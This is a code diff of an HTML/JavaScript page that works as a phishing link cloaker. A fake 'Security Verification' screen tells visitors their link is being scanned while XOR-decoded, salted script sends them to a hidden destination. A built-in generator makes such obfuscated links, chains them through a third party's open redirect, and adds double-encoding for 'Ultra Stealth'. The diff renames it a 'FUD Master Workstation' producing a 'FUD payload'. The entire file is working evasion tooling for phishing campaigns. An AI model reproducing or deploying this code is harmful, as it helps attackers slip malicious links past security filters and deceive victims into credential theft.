@@ -2,36 +2,36 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Security Gateway</title>
+    <title>FUD Master Workstation</title>
     <style id="holdScreen">html { display: none !important; background-color: #f3f4f6; }</style>
 </head>
 <body>
 
     <div id="bouncerUI" style="display:none; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; font-family: 'Segoe UI', sans-serif; background: #ffffff;">
         <div style="text-align: center; padding: 40px; border: 1px solid #e1e1e1; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); max-width: 400px; width: 90%;">
-            <svg width="60" height="60" viewBox="0 0 24 24" fill="#0067b8" style="margin-bottom:20px;">
-                <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/>
-            </svg>
+            <svg width="60" height="60" viewBox="0 0 24 24" fill="#0067b8" style="margin-bottom:20px;"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
             <div style="font-size: 18px; font-weight: 600; color: #333;">Security Verification</div>
             <div style="border: 3px solid #f3f3f3; border-top: 3px solid #0067b8; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto;"></div>
             <div style="font-size: 14px; color: #666;">Scanning link for threats...</div>
-            <div style="font-size: 11px; color: #999; margin-top: 15px;">Verifying secure connection to destination.</div>
         </div>
     </div>
 
     <div id="generatorUI" style="display:none; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; font-family: 'Segoe UI', sans-serif; background: #0f172a; color: white;">
         <div style="width: 100%; max-width: 600px; background: #1e293b; padding: 25px; border-radius: 12px; border: 1px solid #334155;">
-            <h2 style="color:#38bdf8; margin-top:0;">FUD Workstation (15-Salt)</h2>
+            <h2 style="color:#38bdf8; margin-top:0;">FUD Master Workstation</h2>
             
-            <p style="font-size:12px; color:#94a3b8;">1. Paste Worker Link (Stage 1):</p>
+            <p style="font-size:12px; color:#94a3b8;">1. Worker Link (Stage 1):</p>
             <input type="text" id="workerLink" style="width: 100%; padding: 12px; margin: 10px 0; border-radius: 4px; border: 1px solid #475569; background: #0f172a; color: #10b981; box-sizing: border-box;" placeholder="https://...workers.dev/#key">
-            <button onclick="makeStage2()" style="background: #3b82f6; color: white; border: none; padding: 12px; border-radius: 4px; cursor: pointer; width: 100%; font-weight: bold;">GENERATE NEW UNIQUE LINK</button>
-            <div id="stage2Output" style="margin-top: 15px; padding: 15px; background: #020617; border: 1px dashed #38bdf8; color: #fbbf24; font-size: 11px; word-break: break-all; display: none;"></div>
+            <button onclick="makeStage2()" style="background: #3b82f6; color: white; border: none; padding: 12px; border-radius: 4px; cursor: pointer; width: 100%; font-weight: bold;">GENERATE FUD PAYLOAD</button>
+            <div id="stage2Output" style="margin-top: 15px; padding: 10px; background: #020617; border: 1px dashed #38bdf8; color: #fbbf24; font-size: 11px; word-break: break-all; display: none;"></div>
 
             <p style="font-size:12px; color:#94a3b8; margin-top:20px;">2. Merge with Open Redirect:</p>
-            <input type="text" id="redirectBase" style="width: 100%; padding: 12px; margin: 10px 0; border-radius: 4px; border: 1px solid #475569; background: #0f172a; color: #10b981; box-sizing: border-box;" placeholder="https://site.com/logout?url=">
-            <button onclick="mergeLinks()" style="background:#10b981; color: white; border: none; padding: 12px; border-radius: 4px; cursor: pointer; width: 100%; font-weight: bold;">FINAL MERGE</button>
-            <div id="finalOutput" style="margin-top: 15px; padding: 15px; background: #020617; border: 1px dashed #38bdf8; color: #fbbf24; font-size: 11px; word-break: break-all; display: none;"></div>
+            <input type="text" id="redirectBase" style="width: 100%; padding: 12px; margin: 10px 0; border-radius: 4px; border: 1px solid #475569; background: #0f172a; color: #10b981; box-sizing: border-box;" placeholder="https://site.com/proxy?url=">
+            <label style="font-size:12px; display: flex; align-items: center; gap: 8px; cursor: pointer;">
+                <input type="checkbox" id="doubleEncode" style="width:auto; margin:0;"> Enable Double-Encoding (Ultra Stealth)
+            </label>
+            <button onclick="mergeLinks()" style="background:#10b981; color: white; border: none; padding: 12px; border-radius: 4px; cursor: pointer; width: 100%; font-weight: bold; margin-top:10px;">FINALIZE STEALTH LINK</button>
+            <div id="finalOutput" style="margin-top: 15px; padding: 10px; background: #020617; border: 1px dashed #38bdf8; color: #10b981; font-size: 11px; word-break: break-all; display: none;"></div>
         </div>
     </div>
 
@@ -45,13 +45,10 @@
         if (payload) {
             document.getElementById('bouncerUI').style.display = 'flex';
             document.getElementById('holdScreen').remove();
-            
             setTimeout(() => {
                 try {
                     const decodedRaw = atob(payload.replace(/-/g, '+').replace(/_/g, '/'));
-                    // We skip exactly 15 characters of salt
                     const actualEncrypted = decodedRaw.substring(15); 
-                    
                     let dest = "";
                     for (let i = 0; i < actualEncrypted.length; i++) {
                         dest += String.fromCharCode(actualEncrypted.charCodeAt(i) ^ secretKey.charCodeAt(i % secretKey.length));
@@ -67,33 +64,29 @@
         function makeStage2() {
             const input = document.getElementById('workerLink').value;
             if(!input) return;
-            
-            // Generate 15 characters of random salt
             let salt = "";
             const chars = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
-            for (let i = 0; i < 15; i++) {
-                salt += chars.charAt(Math.floor(Math.random() * chars.length));
-            }
-            
+            for (let i = 0; i < 15; i++) { salt += chars.charAt(Math.floor(Math.random() * chars.length)); }
             let encrypted = "";
-            for (let i = 0; i < input.length; i++) {
-                encrypted += String.fromCharCode(input.charCodeAt(i) ^ secretKey.charCodeAt(i % secretKey.length));
-            }
-            
-            const combined = salt + encrypted;
-            const finalPayload = btoa(combined).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
-            
+            for (let i = 0; i < input.length; i++) { encrypted += String.fromCharCode(input.charCodeAt(i) ^ secretKey.charCodeAt(i % secretKey.length)); }
+            const finalPayload = btoa(salt + encrypted).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
             const finalUrl = window.location.origin + window.location.pathname + "?p=" + finalPayload;
-            document.getElementById('stage2Output').innerText = finalUrl;
-            document.getElementById('stage2Output').style.display = 'block';
+            const out = document.getElementById('stage2Output');
+            out.innerText = finalUrl; out.style.display = 'block';
         }
 
         function mergeLinks() {
             const base = document.getElementById('redirectBase').value;
             const github = document.getElementById('stage2Output').innerText;
+            const isDouble = document.getElementById('doubleEncode').checked;
             if(!base || !github) return;
-            document.getElementById('finalOutput').innerText = base + encodeURIComponent(github);
-            document.getElementById('finalOutput').style.display = 'block';
+
+            let finalPath = encodeURIComponent(github);
+            if(isDouble) { finalPath = encodeURIComponent(finalPath); }
+
+            const out = document.getElementById('finalOutput');
+            out.innerText = base + finalPath;
+            out.style.display = 'block';
         }
     </script>
 </body>
